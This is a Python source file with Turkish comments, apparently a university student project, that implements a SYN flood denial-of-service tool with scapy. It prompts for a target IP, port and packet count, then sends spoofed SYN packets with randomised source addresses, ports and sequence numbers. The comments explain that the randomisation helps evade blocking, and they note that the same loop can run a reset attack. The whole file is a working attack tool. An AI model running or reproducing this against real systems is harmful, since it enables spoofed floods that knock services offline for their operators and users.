from os import system
# Farkli isletim sistemlerinde kullanmamizi saglamak amaciyla kullandigimiz bir modul.
# Arabirim olusturmamizi saglar.

from scapy.all import *
# Tarama ve / veya ag saldirilari gerceklestirmemize olanak tanir.
# Cogunlukla network amacli kullanilir.

from random import randint
# Rastgele sayi ugretmemizi saglayan kutuphane.

#######################################################################################


def randomIP():
    ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
    return ip
# Surekli farkli IP adresleri uzerinden atak gerceklestirecegimiz icin
# random IP adresleri uretilmesini saglayan fonksiyon olusturduk.


#######################################################################################


def randomSayi():
    sayi = randint(1000, 9000)
    return sayi
# Surekli farkli sequence number, source port ve window_number kullanacagimiz icin
# random int degerleri olusturmak adina bir fonksiyon olusturduk.


#######################################################################################


def hedefBilgiler():

    system("clear")
    # Terminal ekranini temizlemeye yariyan komut.
    
    print("\n ）︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶（")
    print(" ）          ISTINYE UNIVERSITESI          （")
    print(" ）----------------------------------------（")
    print(" ）           Ping Flood Projesi           （")
    print(" ）           ------------------           （")
    print(" ）               Yusuf AKTAN              （")
    print(" ）︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵（")
    # Ufak bir acilis ekrani.

    print("\n-------------------------------------------------")
    
    hedefIP = input("\n HEDEF IP : ")
    hedefPORT = int(input(" HEDEF Port : "))
    # Hedef IP ve Hedef Port numaralarini kullanicidan alinmasini saglayan inputlar.
    
    print("\n-------------------------------------------------")

    return hedefIP, hedefPORT



#######################################################################################


def main():
    hedefIP, hedefPORT = hedefBilgiler()
    paketsayisi = int(input("\n Kac adet paket gondermek istiyorsun : "))
    SYN_Flood(hedefIP, hedefPORT, paketsayisi)

    # Main fonksiyonumuzda hedefe kac adet paket gonderilmesi istendigi bilgisi aliniyor.
    # Ardindan SYN_Flood fonksiyonumuz cagriliyor ve atak basliyor.


#######################################################################################


def SYN_Flood(hedefIP, hedefPORT, paketsayisi):
# Atak fonksiyonumuz burada.
# Hedefin IP adresi, Port numarasi ve gonderilecek paket sayisi ile calisiyor.

    toplam = 0
    # Toplam kac adet basarili paket gonderildigini
    # kullaniciye gostermek icin olusturulan degisken.

    print(" Paketler Gonderiliyor ...")
    # Paket aktariminin basladigini
    # SYN_Flood fonksiyonunun calistigini gosteren print.
    print("\n-------------------------------------------------")

    for x in range(0, paketsayisi):
    # Gonderilmesi istenen toplam paket sayisi kadar donen bir dongumuz var.
    # Tum islemler bu dongu icerisinde gerceklesiyor.

        source_port = randomSayi()
        sequence_number = randomSayi()
        window_number = randomSayi()
        # Hedefe veri gonderimi saglayabilmek icin
        # oncelikle hedef ile aramizda baglanti kurmamiz gerekiyor.
        # Bu baglantiyi genelde handshaking olarak adlandiriyoruz.
        # Karsi taraf ile handshaking olayini gerceklestirmek icin
        # kendimize random port numarasi, sequence numarasi ve window olusturuyoruz.
        # Eger surekli olarak ayni port numarasi, ayni ip veya ayni sequence numarasi ile
        # paket gonderimi saglarsak, sunucunun bunu onlemesi cok kolay olur.
        # Basarili bir flood attack icin surekli random source degerleri ile
        # saldiri yapmak, saldiriyi daha basarili kilacaktir.

        IP_paketleri = IP()
        # IP'lerin tutulacagi bir IP pakedi uretiyoruz.

        IP_paketleri.src = randomIP()
        # Source IP olarak olusturdugumuz randomIP fonksiyonunu cagiriyoruz.
        # Burada random bir IP uzerinden ataklari gerceklestirmek cok onemli.
        # Genelde ayni IP uzerinden belli sayida paket ayni hedefe giderse
        # karsi taraf bu veri aktarimini durdurabiliyor.

        IP_paketleri.dst = hedefIP
        # Destination IP olarak kullanicinin girdigi IP adresini kullaniyoruz.

        TCP_paketleri = TCP()
        # TCP verilerinin tutulacagi bir TCP pakedi uretiyoruz.

        TCP_paketleri.sport = source_port
        # Source Port olarak tekrar random bir port numarasi giriyoruz.

        TCP_paketleri.dport = hedefPORT
        # Destination Port olarak kullanicinin girdigi Port numarasini kullaniyoruz.

        TCP_paketleri.flags = "S"
        # Burada SYN Flood saldirisi gerceklestirecegimiz icin
        # "S" bayragini kullaniyoruz.
        # Atak turune gore bayrak turumuz degisiyor.
        # Reset Attack yapmak istersen "R" bayragini kullaniyoruz.

        TCP_paketleri.seq = sequence_number
        # Sequence number olarak random bir sayi giriyoruz.

        TCP_paketleri.window = window_number
        # Window number olarak random bir sayi giriyoruz.

        send(IP_paketleri / TCP_paketleri, verbose=0)
        # Son olarak olusturmus oldugumuz IP ve TCP paketlerini
        # karsi tarafa yolluyoruz.
        # send komutunu scapy kutuphanesi sayesinde kullaniyoruz.
        # verbose=0 komutunu ekrana birsey basilmamasini istedigimiz icin kullandik.

        toplam += 1
        # Her dongu sonunda gonderilen paket sayisini bir arttiriyoruz.
        # Bu sayede islem sonunda kullaniciye toplam gonderilen paket sayisini bastiracagiz.

        if paketsayisi * 0.25 == toplam:
            print(" %25  (#########---------------------------)")
        if paketsayisi * 0.50 == toplam:
            print(" %50  (##################------------------)")
        if paketsayisi * 0.75 == toplam:
            print(" %75  (###########################---------)")
        if paketsayisi == toplam:
            print(" %100 (####################################)")
        # Paket gonderiminin ne asamada oldugunu belirtmek adina
        # yuzde seklinde ekrana basilmasini saglayan if bloklari olusturduk.


#######################################################################################


    print("-------------------------------------------------")
    print("\n Basariyla gonderilen toplam paket sayisi : ", toplam, "\n")
    print("-------------------------------------------------")
    # Islem burada bitiyor ve ekrana kac adet basarili paket gonderildigi bilgisi basiliyor.


#######################################################################################

main()
